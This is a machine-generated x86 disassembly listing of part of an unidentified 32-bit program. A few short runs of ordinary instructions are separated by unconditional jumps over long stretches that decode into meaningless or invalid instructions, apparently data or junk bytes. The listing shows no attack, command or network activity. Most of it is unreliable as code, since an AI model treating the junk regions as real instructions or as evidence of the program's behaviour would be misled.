  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x786a0603]
  406db5:	adc    al,0x8d
  406db7:	jo     0x406dc3
  406db9:	mov    ebx,DWORD PTR [eax]
  406dbb:	sbb    BYTE PTR [esi+0x3e181812],bl
  406dc1:	out    dx,eax
  406dc2:	(bad)  [esi]
  406dc4:	fistp  DWORD PTR [eax]
  406dc6:	mov    cl,0x26
  406dc8:	es call 0x90cf75f3
  406dce:	fsubr  DWORD PTR [esi+0x273566fa]
  406dd4:	or     bh,cl
  406dd6:	xchg   edx,eax
  406dd7:	sbb    al,0x74
  406dd9:	sbb    BYTE PTR [edx-0x74],cl
  406ddc:	or     BYTE PTR [ebp-0x2b],bl
  406ddf:	pop    esp
  406de0:	push   cs
  406de1:	daa    
  406de2:	adc    BYTE PTR [eax+0xd4d7dfb],dh
  406de8:	dec    eax
  406de9:	cmp    eax,0xc1f1d6c9
  406def:	retf   
  406df0:	pusha  
  406df1:	je     0x406dc8
  406df3:	inc    esp
  406df4:	dec    ecx
  406df5:	mov    edx,0xe61fb963
  406dfa:	neg    BYTE PTR [ebx]
  406dfc:	xor    BYTE PTR [ebx*1-0x7173b710],bh
  406e03:	inc    eax
  406e04:	out    dx,al
  406e05:	xor    eax,esi
  406e07:	pop    ebx
  406e08:	retfw  
  406e0a:	call   0xc282:0xc66e531d
  406e11:	mov    dl,0x42
  406e13:	je     0x406e12
  406e15:	cmp    DWORD PTR [eax],0x33
  406e18:	lea    esi,[ebx-0x80]
  406e1b:	inc    ebp
  406e1c:	cmp    ebx,esp
  406e1e:	leave  
  406e1f:	mov    dl,BYTE PTR [edx+0x30]
  406e22:	sub    DWORD PTR [edi],esp
  406e24:	jbe    0x406dcb
  406e26:	mov    edx,0xed4e8b3a
  406e2b:	jp     0x406e92
  406e2d:	pop    esi
  406e2e:	jae    0x406de7
  406e30:	mov    eax,ds
  406e32:	and    eax,0x2c59e4c0
  406e37:	(bad)  
  406e39:	and    ebp,esi
  406e3b:	maskmovq mm2,(bad)
  406e3c:	not    DWORD PTR [edx]
  406e3e:	lahf   
  406e3f:	mov    cl,0xfa
  406e41:	jb     0x406e37
  406e43:	out    0x4f,al
  406e45:	pop    esi
  406e46:	fadd   QWORD PTR [esi+edi*4-0x2bf6e2c4]
  406e4d:	jg     0x406dcf
  406e4f:	pop    ds
  406e50:	out    0x6a,eax
  406e52:	ss dec ecx
  406e54:	inc    esp
  406e55:	xchg   esp,eax
  406e56:	inc    esi
  406e57:	fdiv   DWORD PTR [eax]
  406e59:	fnsave [ebx+eax*4-0xf2549de]
  406e60:	mov    ah,BYTE PTR [eax+0x5e904410]
  406e66:	adc    BYTE PTR [esi+0x302af46e],0xda
  406e6d:	jg     0x406e83
  406e6f:	pop    ds
  406e70:	into   
  406e71:	jle    0x406ec8
  406e73:	mov    BYTE PTR [ebx+0x3e],ch
  406e76:	test   edx,0x1322ac40
  406e7c:	ror    DWORD PTR ds:0x2eec8ef4,cl
  406e82:	rcr    DWORD PTR [edi],1
  406e84:	fstp   DWORD PTR [ebp+0x44]
  406e87:	retf   0x20c3
  406e8a:	xchg   ebp,eax
  406e8b:	sbb    edx,eax
  406e8d:	jns    0x406ee6
  406e8f:	xchg   ebp,eax
  406e90:	or     BYTE PTR [edi+0x305b1235],cl
  406e96:	add    ebx,0xffffff92
  406e99:	imul   esp,DWORD PTR [ebx+0x478e1faa],0xffffffc9
  406ea0:	and    esi,DWORD PTR [eax]
  406ea2:	pop    DWORD PTR [edi-0x30]
  406ea5:	xchg   ecx,eax
  406ea6:	add    eax,0x9b4f3292
  406eab:	out    0x95,al
  406ead:	mov    edx,0x672f4e00
  406eb2:	mov    WORD PTR [esi-0x32417bd3],ds
  406eb8:	adc    BYTE PTR [ebp+0x2c],al
  406ebb:	jo     0x406eeb
  406ebd:	mov    bl,0xd7
  406ebf:	ret    
  406ec0:	into   
  406ec1:	cmp    BYTE PTR [ebx+0x1],bh
  406ec4:	pop    ss
  406ec5:	je     0x406f0c
  406ec7:	add    dh,al
  406ec9:	sub    ecx,esi
  406ecb:	mov    ds:0xc937bb7a,eax
  406ed0:	retf   0x7d18
  406ed3:	loop   0x406eb5
  406ed5:	std    
  406ed6:	scas   eax,DWORD PTR es:[edi]
  406ed7:	sahf   
  406ed8:	xchg   ebp,eax
  406ed9:	aaa    
  406eda:	addr16 mov ch,0xeb
  406edd:	jp     0x406e68
  406edf:	in     al,0x67
  406ee1:	pop    ebx
  406ee2:	mov    edi,0x3b08b2d2
  406ee7:	ins    DWORD PTR es:[edi],dx
  406ee8:	enter  0xbe48,0x43
  406eec:	gs adc dh,dh
  406eef:	mov    edi,0xd0380590
  406ef4:	outs   dx,BYTE PTR ds:[esi]
  406ef5:	shr    DWORD PTR [edi-0x7],1
  406ef8:	and    edx,DWORD PTR [edi-0x70]
  406efb:	lahf   
  406efc:	cwde   
  406efd:	inc    esi
  406efe:	inc    edi
  406eff:	sbb    DWORD PTR [ecx],0x32aaed46
  406f05:	inc    ebp
  406f06:	cdq    
  406f07:	pop    ds
  406f08:	lahf   
  406f09:	mov    bh,0x9d
  406f0b:	out    dx,al
  406f0c:	sub    eax,0x59d556c0
  406f11:	cmp    eax,0x2c989891
  406f16:	mov    dl,0x91
  406f18:	xlat   BYTE PTR ds:[ebx]
  406f19:	push   ss
  406f1a:	clc    
  406f1b:	jmp    0x406ef3
  406f1d:	call   0x1692:0x8c3a2a78
  406f24:	sub    bl,dh
  406f26:	or     eax,0x48dc010d
  406f2b:	idiv   DWORD PTR [ecx+0x7]
  406f2e:	inc    ebp
  406f2f:	mov    BYTE PTR [edx],ch
  406f31:	inc    ecx
  406f32:	mov    ds:0x94cd8267,eax
  406f37:	rol    BYTE PTR [ebp+0x40001d97],cl
  406f3d:	test   eax,0xd8e1eb48
  406f42:	cwde   
  406f43:	into   
  406f44:	xchg   BYTE PTR ds:0x23b7cc3b,al
  406f4a:	jg     0x406fb2
  406f4c:	loop   0x406fb7
  406f4e:	mov    al,ds:0xb9f337f5
  406f53:	mov    bl,0x6d
  406f55:	das    
  406f56:	shr    BYTE PTR [eax+0x0],0x3e
  406f5a:	sbb    BYTE PTR [ecx-0x506f3d94],0xf9
  406f61:	and    cl,dh
  406f63:	pop    esi
  406f64:	or     eax,0xffd45a1f
  406f69:	aaa    
  406f6a:	imul   ah
  406f6c:	mov    ch,BYTE PTR [edi-0x46]
  406f6f:	and    DWORD PTR [edx],edx
  406f71:	das    
  406f72:	aam    0x5
  406f74:	dec    edx
  406f75:	retf   
  406f76:	jecxz  0x406f9b
  406f78:	inc    ebx
  406f79:	out    0xe3,al
  406f7b:	das    
  406f7c:	sub    BYTE PTR [edi],ch
  406f7e:	stos   DWORD PTR es:[edi],eax
  406f7f:	hlt    
  406f80:	add    ch,dh
  406f82:	cwde   
  406f83:	fucom  st(2)
  406f85:	mov    eax,es:0x6e1f1de3
  406f8b:	iret   
  406f8c:	dec    ecx
  406f8d:	pop    esp
  406f8e:	nop
  406f8f:	and    esp,esp
  406f91:	fcomp  DWORD PTR [edx+0x35]
  406f94:	pop    eax
  406f95:	xor    eax,0x9fb0050f
  406f9a:	int3   
  406f9b:	pop    edi
  406f9c:	or     al,0xcf
  406f9e:	adc    BYTE PTR ds:0xa63918f7,al
  406fa4:	mov    ebx,0xd5e37294
  406fa9:	cmp    eax,ebp
  406fab:	int3   
  406fac:	mov    dh,0xe9
  406fae:	test   al,0x3e
  406fb0:	xchg   ecx,eax
  406fb1:	retf   0x52a1
  406fb4:	inc    ebp
  406fb5:	arpl   WORD PTR [eax+0x2d4d65a6],si
  406fbb:	inc    edi
  406fbc:	adc    al,bh
  406fbe:	sbb    al,0xc4
  406fc0:	test   al,0x94
  406fc2:	test   DWORD PTR [esi],esp
  406fc4:	loope  0x40703c
  406fc6:	cdq    
  406fc7:	and    BYTE PTR [esi],0xc6
  406fca:	(bad)  
  406fcb:	ins    BYTE PTR es:[edi],dx
  406fcc:	push   ecx
  406fcd:	nop
  406fce:	mov    al,ds:0xeb907f76
  406fd4:	sub    bl,BYTE PTR [ebx-0x727be528]
  406fda:	and    eax,0xefbeace8
  406fdf:	jl     0x407059
  406fe1:	adc    ah,BYTE PTR [esi-0xd3fa202]
  406fe7:	xchg   edi,eax
  406fe8:	in     eax,0x97
  406fea:	jae    0x406f7e
  406fec:	aad    0xdc
  406fee:	add    eax,0x6fc79115
  406ff3:	pushf  
  406ff4:	gs test al,0x47
  406ff7:	cmp    eax,0x603898f2
  406ffc:	fadd   st,st(0)
  406ffe:	dec    edi
  406fff:	jb     0x40700a
  407001:	repz cli 
  407003:	fimul  WORD PTR [esi-0x3e366b89]
  407009:	call   0x1f798242
  40700e:	repz push 0xffffff92
  407011:	mov    cl,0x2c
  407013:	push   ss
  407014:	xor    esp,edx
  407016:	ins    DWORD PTR es:[edi],dx
  407017:	je     0x407025
  407019:	(bad)  
  40701a:	idiv   BYTE PTR [ebx-0x64bb6660]
  407020:	test   BYTE PTR [ebx+eiz*1-0x35],dl
  407024:	call   0x31db3ca8
  407029:	xor    BYTE PTR [esp+edx*2],0xa4
  40702d:	dec    edx
  40702e:	pop    ss
  40702f:	das    
  407030:	and    DWORD PTR [eax-0xf],0xb51e7ffc
  407037:	inc    edx
  407038:	js     0x40701e
  40703a:	pop    esi
  40703b:	nop
  40703c:	shl    al,0xb6
  40703f:	cmc    
  407040:	cmp    al,0x8c
  407042:	cmp    al,0x3a
  407045:	dec    ecx
  407046:	stos   BYTE PTR es:[edi],al
  407047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407048:	push   ds
  407049:	in     eax,0x8d
  40704b:	shr    DWORD PTR [esp+esi*1+0x6aa81489],1
  407052:	popa   
  407053:	into   
  407054:	leave  
  407055:	aam    0x3e
  407057:	push   ds
  407058:	add    al,0xcb
  40705a:	xor    DWORD PTR [edi],edx
  40705c:	rcl    DWORD PTR [ebx+0xd563dc7],cl
  407062:	clc    
  407063:	lea    esi,ds:0xd7f9f089
  407069:	mov    esi,0x104f5cc6
  40706e:	cli    
  40706f:	outs   dx,DWORD PTR ds:[esi]
  407070:	jno    0x40709d
  407072:	cmp    BYTE PTR [eax],ch
  407074:	(bad)  
  407075:	iret   
  407076:	xchg   ecx,eax
  407077:	dec    esi
  407078:	jae    0x4070b1
  40707a:	push   esp
  40707b:	and    eax,0xc507e28e
  407080:	in     eax,0x51
  407082:	mov    ch,0xb6
  407084:	xchg   ebp,eax
  407085:	not    DWORD PTR [ebx-0x71]
  407088:	or     ebp,DWORD PTR [edi+0x57805936]
  40708e:	cli    
  40708f:	or     edx,DWORD PTR [eax-0x19]
  407092:	inc    esi
  407093:	(bad)  
  407094:	mov    ah,0xee
  407096:	lods   al,BYTE PTR ds:[esi]
  407097:	(bad)  
  407099:	add    ebp,DWORD PTR [edx+0xd]
  40709c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40709d:	adc    eax,0x337d9671
  4070a2:	jno    0x4070d6
  4070a4:	imul   eax,DWORD PTR [eax],0x7072e936
  4070aa:	push   ds
  4070ab:	popf   
  4070ac:	mov    al,0x6a
  4070ae:	into   
  4070af:	jbe    0x4070a7
  4070b1:	neg    ch
  4070b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070b4:	call   0xfc1d:0xb0098011
  4070bb:	mov    dl,0x3
  4070bd:	lahf   
  4070be:	js     0x40706c
  4070c0:	scas   eax,DWORD PTR es:[edi]
  4070c1:	xchg   edi,eax
  4070c2:	imul   esi,edi,0x785403eb
  4070c8:	jbe    0x40712d
  4070ca:	retf   
  4070cb:	fs pop ebp
  4070cd:	nop
  4070ce:	inc    edi
  4070cf:	(bad)  [ecx]
  4070d1:	bound  esp,QWORD PTR [esi]
  4070d3:	add    ebp,ecx
  4070d5:	add    eax,0x3c73600f
  4070da:	adc    eax,0xba62514f
  4070df:	fsubrp st(7),st
  4070e1:	sub    eax,0x3347f227
  4070e6:	adc    dl,BYTE PTR [eax+ebp*4]
  4070e9:	cwde   
  4070ea:	icebp  
  4070eb:	(bad)  
  4070ec:	mov    eax,0x8eda750d
  4070f1:	ss cwde 
  4070f3:	inc    ebx
  4070f4:	pop    ebx
  4070f5:	pop    ecx
  4070f6:	lock mov ds:0xec1d19f2,al
  4070fc:	mov    cl,BYTE PTR [edx+0x32]
  4070ff:	retf   
  407100:	sbb    al,0xc7
  407102:	mov    ch,0xac
  407104:	pop    edx
  407105:	fld    QWORD PTR [ebp-0x72c41747]
  40710b:	in     al,dx
  40710c:	xor    BYTE PTR [esi],0xb9
  40710f:	imul   ebx,DWORD PTR [ebx+0x4e],0x1c623053
  407116:	dec    esi
  407117:	imul   cl
  407119:	mov    bh,0x23
  40711b:	mov    cl,0x51
  40711d:	cmp    DWORD PTR [ecx],eax
  40711f:	jmp    0xa5d2d800
  407124:	in     eax,dx
  407125:	cmc    
  407126:	lods   al,BYTE PTR ds:[esi]
  407127:	mov    al,0xbc
  407129:	lods   eax,DWORD PTR ds:[esi]
  40712a:	xor    al,0x3f
  40712c:	pop    eax
  40712d:	xor    esi,ecx
  40712f:	jmp    0x4998:0x6e5d86dc
  407136:	cs repz xor al,0x6f
  40713a:	xlat   BYTE PTR ds:[ebx]
  40713b:	sub    al,0x51
  40713d:	retf   0xff37
  407140:	imul   ecx,esp,0xa17eecb
  407146:	ss loopne 0x407172
  407149:	push   ss
  40714a:	jbe    0x40712d
  40714c:	out    0xd1,al
  40714e:	aad    0x8f
  407150:	nop
  407151:	pushf  
  407152:	cdq    
  407153:	xor    al,0x44
  407155:	inc    esi
  407156:	fdiv   DWORD PTR [edi+0x45d8693a]
  40715c:	out    dx,al
  40715d:	inc    eax
  40715e:	mov    ebx,0x932cd6b
  407163:	sbb    al,0x9b
  407165:	popf   
  407166:	lock lds esp,FWORD PTR [edi]
  407169:	mov    ch,0x6e
  40716b:	mov    fs,WORD PTR [edx]
  40716d:	shl    BYTE PTR [eax],cl
  40716f:	xchg   edi,eax
  407170:	lods   eax,DWORD PTR ds:[esi]
  407171:	push   edx
  407172:	cmp    BYTE PTR [ecx-0x1632d92f],ch
  407178:	std    
  407179:	popa   
  40717a:	scas   eax,DWORD PTR es:[edi]
  40717b:	xlat   BYTE PTR ds:[ebx]
  40717c:	jmp    0xc88b:0x1916bf9
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	adc    al,BYTE PTR [eax-0x6]
  4071c7:	mov    esi,0x18188590
  4071cc:	sahf   
  4071cd:	adc    bl,BYTE PTR [eax]
  4071cf:	sbb    al,bl
  4071d1:	mov    ebp,0x5e0ff8a7
  4071d6:	inc    esi
  4071d7:	add    BYTE PTR [ecx-0x2b],dl
  4071da:	imul   esp,DWORD PTR [ecx-0x54a61a3d],0x75
  4071e1:	dec    edi
  4071e2:	adc    DWORD PTR [ebp-0x38],ecx
  4071e5:	leave  
  4071e6:	fidivr WORD PTR [edx]
  4071e8:	jecxz  0x4071cc
  4071ea:	or     DWORD PTR [edx],edx
  4071ec:	push   ds
  4071ed:	add    ah,al
  4071ef:	mov    ah,0xbd
  4071f1:	push   DWORD PTR [edi-0x3cd5629b]
  4071f7:	pop    ecx
  4071f8:	enter  0xe350,0xcf
  4071fc:	or     dh,ah
  4071fe:	xor    BYTE PTR [ebx-0x1a],dh
  407201:	sbb    BYTE PTR [ecx-0x425efa8e],ch
  407207:	push   esi
  407208:	nop
  407209:	in     eax,0xed
  40720b:	cld    
  40720c:	imul   esp,DWORD PTR [edx],0x75
  40720f:	jge    0x4071d1
  407211:	shl    DWORD PTR [esi-0x6d9c8032],1
  407217:	mov    ah,0xe0
  407219:	jmp    FWORD PTR [eax-0x620567c3]
  40721f:	and    ch,BYTE PTR [eax+0x5b]
  407222:	cmp    ebx,DWORD PTR ss:[edx]
  407225:	into   
  407226:	sbb    BYTE PTR [ebx],dh
  407228:	and    al,bh
  40722a:	in     al,0x9
  40722c:	imul   DWORD PTR [edx-0x42]
  40722f:	xchg   ecx,eax
  407230:	mov    ds:0xea10779e,al
  407235:	fst    DWORD PTR [ecx]
  407237:	stos   DWORD PTR es:[edi],eax
  407238:	add    esp,DWORD PTR [edi+0x24305522]
  40723e:	mov    edx,0xa7fba67
  407243:	xchg   dh,bl
  407245:	sbb    dl,BYTE PTR [edx-0xbeffad2]
  40724b:	cwde   
  40724c:	sahf   
  40724d:	pop    edx
  40724e:	sub    al,0xb5
  407250:	and    al,0xb6
  407252:	xchg   edx,eax
  407253:	(bad)  
  407254:	sub    esi,DWORD PTR [ecx+0x52]
  407257:	mov    edi,0x151ac265
  40725c:	shr    BYTE PTR [edx+0x3a4990fb],0x63
  407263:	scas   eax,DWORD PTR es:[edi]
  407264:	pop    esi
  407265:	jo     0x407230
  407267:	push   0xffffff99
  407269:	dec    edx
  40726a:	pop    es
  40726b:	test   DWORD PTR [esi-0x7605a5e1],eax
  407271:	adc    bh,dl
  407273:	add    BYTE PTR [eax+0x4805aee6],bh
  407279:	push   ss
  40727a:	out    dx,eax
  40727b:	stos   DWORD PTR es:[edi],eax
  40727c:	mov    ch,BYTE PTR [eax-0x74]
  40727f:	push   edx
  407280:	push   es
  407281:	int    0xf1
  407283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407284:	out    dx,al
  407285:	dec    esp
  407286:	call   0x6a567720
  40728b:	inc    ecx
  40728c:	shl    ecx,0xf4
  40728f:	pop    ss
  407290:	in     al,dx
  407291:	ds jp  0x407267
  407294:	xchg   ecx,eax
  407295:	adc    eax,0x50a658f0
  40729a:	hlt    
  40729b:	adc    DWORD PTR [ecx+0x66],ebx
  40729e:	fwait
  40729f:	aaa    
  4072a0:	cmp    cl,BYTE PTR [ecx-0x1a]
  4072a3:	inc    ebp
  4072a4:	in     al,dx
  4072a5:	or     al,0xca
  4072a7:	cmp    al,0x47
  4072a9:	xchg   ebx,eax
  4072aa:	imul   eax,DWORD PTR [edx+0x6e3fc327],0xab79944f
  4072b4:	adc    DWORD PTR [ebp+ecx*2+0x1e9127a4],eax
  4072bb:	mov    cl,0xc
  4072bd:	sbb    ecx,DWORD PTR [ebx+eiz*2]
  4072c0:	mov    eax,0x815ed733
  4072c5:	lock data16 jbe 0x4072eb
  4072c9:	(bad)  
  4072ca:	push   bx
  4072cc:	add    al,0x47
  4072ce:	adc    bl,BYTE PTR [eax+0x33]
  4072d1:	adc    dh,BYTE PTR [eax]
  4072d3:	jmp    0x30c01464
  4072d8:	jmp    0x4072aa
  4072da:	test   DWORD PTR [ecx+0x5a],edx
  4072dd:	or     DWORD PTR [ecx+eax*4],0x44
  4072e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072e2:	pushf  
  4072e3:	dec    ebp
  4072e4:	add    al,0x6e
  4072e6:	test   eax,0x3e67e2bb
  4072eb:	mov    cl,0xf9
  4072ed:	inc    edi
  4072ee:	add    ch,BYTE PTR [esi+0x4998aa31]
  4072f4:	call   0xd5f67107
  4072f9:	sub    al,0x4a
  4072fb:	outs   dx,DWORD PTR ds:[esi]
  4072fc:	test   BYTE PTR [ecx],bl
  4072fe:	cmp    DWORD PTR [edx+0x54],edi
  407301:	xor    dl,BYTE PTR [ebp+0xc163f61]
  407307:	enter  0xd43,0xb2
  40730b:	call   0xdd49:0xf3b44f72
  407312:	pop    esi
  407313:	pop    ecx
  407314:	popf   
  407315:	call   0x7e1d:0x57fe
  40731b:	mov    ecx,0xab0edbc6
  407320:	loope  0x407318
  407322:	sbb    DWORD PTR [esi-0x13489424],ebp
  407328:	push   ds
  407329:	jo     0x407392
  40732b:	mov    ebx,DWORD PTR [ebx+0x6c]
  40732e:	ins    DWORD PTR es:[edi],dx
  40732f:	aad    0x2f
  407331:	mov    al,BYTE PTR [edx-0x26]
  407334:	arpl   WORD PTR ds:[ecx-0x15],di
  407338:	sbb    dl,BYTE PTR [eax+0x52]
  40733b:	and    al,0x6c
  40733d:	cmp    ecx,edx
  40733f:	out    dx,eax
  407340:	adc    ebx,ebp
  407342:	jbe    0x4072f9
  407344:	pop    ebx
  407345:	fist   DWORD PTR [eax-0x3c]
  407348:	mov    BYTE PTR [ecx+0x5a],ch
  40734b:	retf   0xb8a2
  40734e:	pop    ss
  40734f:	cli    
  407350:	sbb    eax,0xa19e6cc3
  407355:	add    ebx,0x33d72fc1
  40735b:	dec    esi
  40735c:	mov    al,ds:0xb1fd60b2
  407361:	ins    DWORD PTR es:[edi],dx
  407362:	push   ss
  407363:	retf   0x9c6e
  407366:	sbb    BYTE PTR [ebx-0x4a9e2911],ch
  40736c:	sub    bh,BYTE PTR [edx-0x4a2e2920]
  407372:	popa   
  407373:	jp     0x40733c
  407375:	(bad)  
  407376:	aam    0x2a
  407378:	mov    esp,0x5ed7c548
  40737d:	jmp    0x5199:0x46595e9d
  407384:	ja     0x40739b
  407386:	cmp    ebx,DWORD PTR [ecx-0x7153f564]
  40738c:	stos   DWORD PTR es:[edi],eax
  40738d:	sbb    eax,esp
  40738f:	add    al,0x80
  407391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407392:	inc    esp
  407393:	mov    ebx,0x6fa74ec8
  407398:	xor    edx,DWORD PTR [ebx]
  40739a:	xchg   BYTE PTR [eax+eiz*2-0x3f],dh
  40739e:	xor    cl,dl
  4073a0:	dec    esp
  4073a1:	sub    dh,BYTE PTR [ebp+0x138a5c85]
  4073a7:	xor    DWORD PTR [eax-0x54],0x9a8c3dc6
  4073ae:	sub    al,0x59
  4073b0:	aaa    
  4073b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073b2:	sub    eax,0x2f89ed58
  4073b7:	or     eax,0x99c7be89
  4073bc:	mov    bl,0x4d
  4073be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073bf:	xchg   esi,eax
  4073c0:	int    0xb5
  4073c2:	popa   
  4073c3:	lahf   
  4073c4:	sar    edx,0x48
  4073c7:	push   esp
  4073c8:	mov    DWORD PTR [ebx-0x3b777772],edx
  4073ce:	bound  edx,QWORD PTR [eax]
  4073d0:	loop   0x40742b
  4073d2:	addr16 dec eax
  4073d4:	jmp    0x4073cf
  4073d6:	dec    ebp
  4073d7:	mov    ecx,0xab49ce7e
  4073dc:	popf   
  4073dd:	fist   DWORD PTR [eax-0xc]
  4073e0:	fidivr DWORD PTR [ebp+0x4f]
  4073e3:	cdq    
  4073e4:	js     0x407421
  4073e6:	stc    
  4073e7:	stc    
  4073e8:	jbe    0x407449
  4073ea:	div    DWORD PTR [ecx]
  4073ec:	pop    ecx
  4073ed:	pop    ebp
  4073ee:	(bad)  
  4073ef:	(bad)  
  4073f0:	sbb    ebp,edi
  4073f2:	test   BYTE PTR [edi],ch
  4073f4:	out    0x90,eax
  4073f6:	stos   DWORD PTR es:[edi],eax
  4073f7:	or     ecx,DWORD PTR [edi+0x33]
  4073fa:	ror    dh,0xa3
  4073fd:	rcl    ebp,1
  4073ff:	repz mov ebx,0x218059e8
  407405:	xlat   BYTE PTR ds:[ebx]
  407406:	inc    esp
  407407:	jae    0x407460
  407409:	mov    esp,0xdd1faae3
  40740e:	xchg   bl,dl
  407410:	(bad)  
  407411:	popa   
  407412:	mov    fs,WORD PTR [ebx+0x2d]
  407415:	add    al,0x5e
  407417:	pusha  
  407418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407419:	call   0xa52d:0x8662e39b
  407420:	pop    ebx
  407421:	xor    ecx,DWORD PTR [ebp+esi*2+0x52291c33]
  407428:	sub    esi,DWORD PTR ds:0x467f024a
  40742e:	out    dx,al
  40742f:	pushf  
  407430:	rol    esi,cl
  407432:	ins    DWORD PTR es:[edi],dx
  407433:	in     eax,0x5e
  407435:	or     edi,DWORD PTR [ecx+0x4e]
  407438:	call   0xe51ddb73
  40743d:	outs   dx,BYTE PTR ds:[esi]
  40743e:	(bad)  
  407440:	mov    ebp,0x64f3ee5
  407445:	jge    0x40748f
  407447:	fs mov ebx,0x97e65d7c
  40744d:	mov    ds:0x9507f643,eax
  407452:	mov    ds:0xcb5711ec,eax
  407457:	jmp    0x40744f
  407459:	jmp    0x1d86:0x4bf3e5e5
  407460:	int    0x49
  407462:	jno    0x4073e9
  407464:	lods   eax,DWORD PTR ds:[esi]
  407465:	or     ebp,DWORD PTR [ecx-0x31f89bbe]
  40746b:	add    BYTE PTR [esi],bh
  40746d:	pop    eax
  40746e:	lods   al,BYTE PTR ds:[esi]
  40746f:	and    dh,BYTE PTR [edi]
  407471:	xor    cl,dl
  407473:	mov    ds:0xbe7595ed,al
  407478:	repz adc edx,DWORD PTR [ebp-0x3f]
  40747c:	and    DWORD PTR [ecx-0x718cf205],ebx
  407482:	dec    ebp
  407483:	sbb    al,0xff
  407485:	jecxz  0x4074e5
  407487:	add    esp,DWORD PTR [ebp-0x2b]
  40748a:	rcl    DWORD PTR [ebx-0x26],0x5a
  40748e:	jns    0x4074be
  407490:	jmp    0x302a:0x953b016f
  407497:	fisub  WORD PTR [edx-0x1]
  40749a:	push   eax
  40749b:	jge    0x40743d
  40749d:	daa    
  40749e:	or     eax,0xc43e7fbd
  4074a3:	inc    ebp
  4074a4:	mov    ebx,0xe84cafe5
  4074a9:	or     ch,BYTE PTR [eax]
  4074ab:	dec    eax
  4074ac:	clc    
  4074ad:	adc    eax,0x2254bc35
  4074b2:	popf   
  4074b3:	cmp    BYTE PTR [edi],al
  4074b5:	sbb    BYTE PTR [edi-0x40e56ca4],cl
  4074bb:	jb     0x40744f
  4074bd:	push   ecx
  4074be:	neg    BYTE PTR [edx+0x6e]
  4074c1:	add    eax,0x9e4b18d2
  4074c6:	pop    es
  4074c7:	adc    BYTE PTR [ebp+0x4e],0x85
  4074cb:	xchg   edx,eax
  4074cc:	test   al,0xb2
  4074ce:	hlt    
  4074cf:	test   eax,0xdf090fcd
  4074d4:	popf   
  4074d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074d6:	xchg   ecx,eax
  4074d7:	xchg   edx,eax
  4074d8:	jnp    0x4074a6
  4074da:	das    
  4074db:	stos   DWORD PTR es:[edi],eax
  4074dc:	sub    BYTE PTR [edx+0x5a],dh
  4074df:	int3   
  4074e0:	es mov al,0x18
  4074e3:	fs mov bl,0x0
  4074e6:	fmul   DWORD PTR [eax]
  4074e8:	jne    0x4074ee
  4074ea:	mov    esi,0x55360cd9
  4074ef:	test   al,0x70
  4074f1:	xchg   BYTE PTR [eax-0x6d740660],al
  4074f7:	mov    esp,0xd8f0793d
  4074fc:	jbe    0x4074e0
  4074fe:	push   esi
  4074ff:	cwd    
  407501:	bound  ecx,QWORD PTR [esi-0x66]
  407504:	gs addr16 loop 0x4074c8
  407508:	inc    ecx
  407509:	and    ah,BYTE PTR [ebp-0x721939f1]
  40750f:	pop    eax
  407510:	(bad)  
  407511:	loope  0x40749c
  407513:	sub    dl,BYTE PTR [ebp-0x80]
  407516:	push   ecx
  407517:	(bad)  
  407518:	xor    eax,0xae1b6813
  40751d:	sub    eax,DWORD PTR [edi-0x67f4dc17]
  407523:	cmp    BYTE PTR [ecx],ch
  407525:	or     BYTE PTR [ebx],ch
  407527:	gs mov dh,0xea
  40752a:	sti    
  40752b:	sub    ecx,esi
  40752d:	rcr    DWORD PTR [edi],0xe2
  407530:	xlat   BYTE PTR ds:[ebx]
  407531:	lea    ecx,[ebp+0x7d042330]
  407537:	dec    eax
  407538:	icebp  
  407539:	xor    edi,DWORD PTR [ebx-0x70]
  40753c:	mov    bl,0x42
  40753e:	dec    ebx
  40753f:	add    esi,ebp
  407541:	cld    
  407542:	xchg   esi,eax
  407543:	enter  0x6169,0x33
  407547:	and    DWORD PTR [ebp-0x4c377328],esi
  40754d:	nop
  40754e:	fld    DWORD PTR [esi]
  407550:	out    0xe,eax
  407552:	fimul  WORD PTR [ecx]
  407554:	fnstcw WORD PTR [ebx+0x2b702b12]
  40755a:	mov    dh,0xf0
  40755c:	xor    edi,ebp
  40755e:	add    eax,0xd5533084
  407563:	hlt    
  407564:	sub    ebp,eax
  407566:	dec    ecx
  407567:	imul   ecx,DWORD PTR [ecx-0x40],0xffffff8b
  40756b:	lds    esi,FWORD PTR [ebp+0x14eab22]
  407571:	push   ebx
  407572:	aaa    
  407573:	xor    dl,BYTE PTR [esi]
  407575:	and    cl,dl
